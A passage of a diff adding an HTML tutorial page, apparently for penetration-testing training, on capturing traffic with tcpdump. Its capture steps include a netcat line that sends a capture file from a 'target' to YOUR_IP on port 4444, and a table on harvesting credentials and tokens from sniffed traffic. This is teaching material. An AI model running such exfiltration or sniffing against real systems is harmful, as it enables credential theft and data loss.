+                            <div class="step-text">Check available interfaces:<br><code>tcpdump -D</code></div>
+                        </div>
+                        <div class="step-item">
+                            <div class="step-number"></div>
+                            <div class="step-text">Start capturing (limit packets so it doesn't run forever):<br><code>tcpdump -i eth0 -c 1000 -w /tmp/capture.pcap</code></div>
+                        </div>
+                        <div class="step-item">
+                            <div class="step-number"></div>
+                            <div class="step-text">Wait for traffic or trigger activity</div>
+                        </div>
+                        <div class="step-item">
+                            <div class="step-number"></div>
+                            <div class="step-text">
+                                Transfer the capture to your machine:<br>
+                                <span class="comment">On your machine:</span> <code>nc -lvnp 4444 > capture.pcap</code><br>
+                                <span class="comment">On target:</span> <code>nc YOUR_IP 4444 &lt; /tmp/capture.pcap</code><br>
+                                <span class="comment">(or use scp, curl, wget, etc.)</span>
+                            </div>
+                        </div>
+                        <div class="step-item">
+                            <div class="step-number"></div>
+                            <div class="step-text">Analyze in Wireshark on your machine</div>
+                        </div>
+                    </div>
+
+                    <h4 style="font-size: 0.85rem; color: var(--terminal-red); margin: 24px 0 12px; font-weight: 500;">What to Look For</h4>
+
+                    <table class="reference-table">
+                        <thead>
+                            <tr>
+                                <th>Traffic</th>
+                                <th>Why it matters</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>HTTP</td>
+                                <td>Credentials, session tokens, sensitive data</td>
+                            </tr>
+                            <tr>
+                                <td>FTP / Telnet</td>
+                                <td>Plaintext passwords</td>
+                            </tr>
+                            <tr>
+                                <td>DNS queries</td>
+                                <td>Internal hostnames and services</td>
+                            </tr>
+                            <tr>
+                                <td>SMB</td>
+                                <td>File share access, usernames</td>
+                            </tr>
+                            <tr>
+                                <td>Any unencrypted traffic</td>
+                                <td>Internal networks often don't encrypt</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Section 7: Quick Reference Card -->
+            <section class="content-section">
+                <h2 class="section-title">Quick Reference Card</h2>
+                <p class="section-intro">Copy-paste ready commands for common tasks.</p>
+
+                <div class="quick-ref-card">
+                    <div class="quick-ref-header">
+                        <div class="quick-ref-dot red"></div>
+                        <div class="quick-ref-dot yellow"></div>
+                        <div class="quick-ref-dot green"></div>
+                        <span class="quick-ref-title">tcpdump cheatsheet</span>
+                    </div>
+                    <table class="reference-table">
+                        <thead>
+                            <tr>
+                                <th>Task</th>
+                                <th>Command</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Capture all traffic</td>
+                                <td><code>sudo tcpdump -i any</code></td>
+                            </tr>
+                            <tr>
+                                <td>Capture 500 packets to file</td>
+                                <td><code>sudo tcpdump -c 500 -w capture.pcap</code></td>
+                            </tr>
+                            <tr>
+                                <td>Capture HTTP traffic only</td>
+                                <td><code>sudo tcpdump port 80</code></td>
+                            </tr>
+                            <tr>
+                                <td>Capture traffic to/from host</td>
+                                <td><code>sudo tcpdump host 10.10.10.5</code></td>
+                            </tr>
+                            <tr>
+                                <td>Read a capture file</td>
+                                <td><code>tcpdump -r capture.pcap</code></td>
+                            </tr>
+                            <tr>
+                                <td>Capture without DNS resolution</td>
+                                <td><code>sudo tcpdump -nn</code></td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </section>
+
+            <!-- Glossary -->
+            <section class="content-section">
+                <h2 class="section-title">Glossary</h2>
+
+                <div class="glossary-grid">
+                    <div class="glossary-item">
+                        <div class="glossary-term">Interface</div>
+                        <div class="glossary-def">Network adapter (eth0, wlan0, etc.)</div>
+                    </div>
+                    <div class="glossary-item">
+                        <div class="glossary-term">pcap</div>
+                        <div class="glossary-def">Packet capture file format (.pcap or .pcapng)</div>
+                    </div>
+                    <div class="glossary-item">
+                        <div class="glossary-term">Filter</div>
+                        <div class="glossary-def">Rule to capture only matching traffic</div>
+                    </div>
+                    <div class="glossary-item">
+                        <div class="glossary-term">Verbose</div>
+                        <div class="glossary-def">More detailed output (-v, -vv, -vvv)</div>
+                    </div>
+                    <div class="glossary-item">
+                        <div class="glossary-term">DNS resolution</div>
+                        <div class="glossary-def">Converting IP addresses to hostnames (disabled with -n)</div>
+                    </div>
+                </div>
+            </section>
+
+        </div>
+    </div>
+
+    <script>
+        function toggleDropdown(btn) {
+            const dropdown = btn.parentElement;
+            const wasOpen = dropdown.classList.contains('open');
+            document.querySelectorAll('.nav-dropdown').forEach(d => d.classList.remove('open'));
+            if (!wasOpen) dropdown.classList.add('open');
+        }
+        document.addEventListener('click', (e) => {
+            if (!e.target.closest('.nav-dropdown')) {
+                document.querySelectorAll('.nav-dropdown').forEach(d => d.classList.remove('open'));
+            }
+        });
+    </script>
+</body>
+</html>
+
